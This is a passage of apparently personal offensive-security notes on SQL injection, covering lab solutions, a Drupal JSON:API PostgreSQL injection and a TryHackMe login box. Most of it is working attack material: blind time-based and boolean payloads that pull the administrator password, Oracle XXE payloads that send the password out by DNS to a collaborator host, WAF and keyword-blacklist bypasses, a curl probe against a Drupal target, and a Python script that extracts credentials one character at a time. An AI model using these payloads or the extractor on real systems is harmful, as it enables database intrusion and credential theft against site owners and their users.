Cookie: TrackingId=x'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

Use `pg_sleep(-1)` in the ELSE branch for faster false-path responses. Sort Intruder results by response time to identify matches.

---

#### Lab 16 — Blind SQL injection with out-of-band interaction
**Technique:** Oracle EXTRACTVALUE/XXE DNS interaction to Burp Collaborator

```sql
-- Payload (URL-encoded for cookie)
Cookie: TrackingId=xyz'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
```

After sending: click "Poll now" in Burp Collaborator — expect 4 DNS interactions. 200 OK response confirms the payload fired.

---

#### Lab 17 — Blind SQL injection with out-of-band data exfiltration
**Technique:** Oracle EXTRACTVALUE/XXE DNS exfiltration — password in subdomain

Method A — direct full password exfiltration:
```sql
-- Embed password in DNS subdomain (single request reveals entire password)
Cookie: TrackingId=xyz'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
-- Collaborator receives DNS: <password>.collaborator.oastify.com
```

Method B — char-by-char conditional (Intruder Battering Ram):
```sql
-- Triggers interaction only when SUBSTR matches; enumerate one char at a time
' UNION SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))='a')
  THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual)
  ELSE NULL END FROM dual--
```

---

#### Lab 18 — SQL injection with filter bypass via XML encoding
**Technique:** XML hex entity encoding to bypass WAF blocking SQL keywords

Context: POST body contains XML with a `storeId` field. WAF returns `403 Attack detected` on raw SQL.

Steps:
1. Test standard payload: `1 UNION SELECT NULL--` → 403.
2. Install Hackvertor Burp extension.
3. Wrap payload in `<@hex_entities>1 UNION SELECT NULL--</@hex_entities>`.
4. Burp encodes each char as XML hex entity; WAF passes it; XML parser decodes it for the DB.
5. Confirm 1 column returned.
6. Extract credentials:

```sql
1 UNION SELECT username||'~'||password FROM users--
-- (encode with Hackvertor before sending)
-- Response: administrator~<password>
```

Login as administrator to solve.

---

## Drupal JSON:API PostgreSQL array-key injection (CVE-2026-9082)

A real-world PDO-placeholder-break pattern worth knowing beyond Drupal. Drupal's DB layer
parameterizes condition values, but the PostgreSQL-specific `Condition::translateCondition()`
derives its PDO placeholder name from the value's array KEY and concatenates it unsanitized.
JSON:API (default-enabled, anonymous) forwards arbitrary filter keys into the query builder.
Because PostgreSQL PDO emulated prepares only accept `[a-zA-Z0-9_]` in a `:placeholder`, a key
containing `)` terminates the placeholder and spills the rest of the key into the query as raw SQL.

Reusable technique details:
- The `--` comment terminator does NOT work (emulated prepares tokenize placeholders through
  comments). Instead balance parentheses explicitly and re-open a trailing group so the
  legitimate placeholder stays valid; replace spaces with `/**/`.
- Blind only: boolean (`OR TRUE` vs `OR FALSE` row-count diff) or time-based
  (`CASE WHEN <cond> THEN pg_sleep(5) ELSE pg_sleep(0) END`), then char-by-char via
  `ASCII(SUBSTR((<subquery>),pos,1)) > mid` binary search.
- High-value reads: `SELECT version()`, `current_user`, and `name`/`mail`/`pass` from
  `users_field_data WHERE uid=1` (admin hash -> offline crack -> privesc).

```bash
# time-based probe through JSON:API (the array KEY carries the injection; URL-encode in practice)
curl -g -s -o /dev/null -w "time=%{time_total}s\n" \
  "https://TARGET/jsonapi/node/article?filter[s][condition][path]=title&filter[s][condition][operator]=IN&filter[s][condition][value][0]=a&filter[s][condition][value][1))/**/OR/**/(SELECT/**/pg_sleep(5))/**/IS/**/NOT/**/NULL/**/OR/**/((1=1]=c"
```

Affected Drupal Core 8.0-11.3.9 (PostgreSQL backend only; not MySQL/MariaDB); fixed 11.3.10 /
11.2.12 / 10.6.9 / 10.5.10 (SA-CORE-2026-004). Single-source (fork PoC); verify against the
drupal.org advisory before relying.

## App-side keyword blacklist (custom PHP "WAF") + login redirect oracle

Some apps roll their own `preg_match` blacklist instead of a real WAF: the login fields are
checked and a match returns a fixed string (e.g. `SQL Injection detected. This incident will be
logged!`) instead of running the query. Real example seen on a THM register/login box:

```php
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
```

Map it empirically (send one token per request, classify blocked vs failed vs success), then bypass:

| Blocked | Bypass |
|---|---|
| ` or ` standalone | use `AND` logic (auth-bypass via a known user + `AND`), not `OR` |
| `/**/` inline comment | plain spaces or `-- -` line comment |
| `0x` hex literal | quoted `'abc'` or `CHAR(97,98)`; never hex (this also breaks sqlmap, below) |
| `sleep` | no time-based; use the boolean/redirect oracle |
| `ifnull` | `CASE WHEN`/`COALESCE` instead |
| `-- ` + 4 alnum | comment with `-- -` (dash) or `#` |

`||` is string-concat on MySQL `PIPES_AS_CONCAT` builds, test before using it as OR.

### Login redirect = boolean oracle (no reflected sink)

When the post-login page is static (nothing reflected), a login that 302s on success / 200s on
failure is still a perfect oracle, with a known user and the `AND` bypass:

```sql
recon1' AND 1=1-- -   -> 302 (TRUE)        recon1' AND 1=2-- -   -> 200 (FALSE)
```

Find the UNION column count the same way (`' UNION SELECT NULL,NULL,NULL,NULL-- -` flips to 302
when the count matches), then extract char-by-char with `ASCII(SUBSTRING((subq),i,1))>N` bisection.

### Why sqlmap fails here (hand-roll instead)

- sqlmap **hex-encodes** extracted strings as `0x...` -> a `/0x/i` filter blocks every data payload.
- `--batch` **follows the 302**, muddying its true/false diff; even `--ignore-redirects --code=302`
  its boundary payloads use `OR`/`/**/` (also blocked) -> "not injectable".

Filter-aware boolean extractor (the two gotchas that cost the most time are in the comments):

```python
import requests
T="http://target/index.php"; s=requests.Session()
def true(cond):
    s.cookies.clear()                      # a login oracle AUTHENTICATES the session; reuse it and
    u="recon1' AND ("+cond+")-- -"         # every probe 302s -> oracle stuck always-true
    return s.post(T,data={"username":u,"password":"x"},allow_redirects=False).status_code==302
def num(e,lo=0,hi=64):
    while lo<hi:
        m=(lo+hi+1)//2; lo,hi=(m,hi) if true("%s>=%d"%(e,m)) else (lo,m-1)
    return lo
def sval(e,maxlen=128):
    L=num("LENGTH((%s))"%e,0,maxlen); o=""
    for i in range(1,L+1):
        lo,hi=32,126
        while lo<hi:
            m=(lo+hi)//2; lo,hi=(m+1,hi) if true("ASCII(SUBSTRING((%s),%d,1))>%d"%(e,i,m)) else (lo,m)
        o+=chr(lo)
    return o
# schema: SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT i,1
# creds:  SELECT username FROM <tbl> LIMIT i,1   /   SELECT password FROM <tbl> LIMIT i,1
```

Do not name the script `enum.py` (shadows stdlib `enum` -> `import requests` circular-import crash).
On the box this came from, creds were stored **plaintext** and reused for SSH (port 22).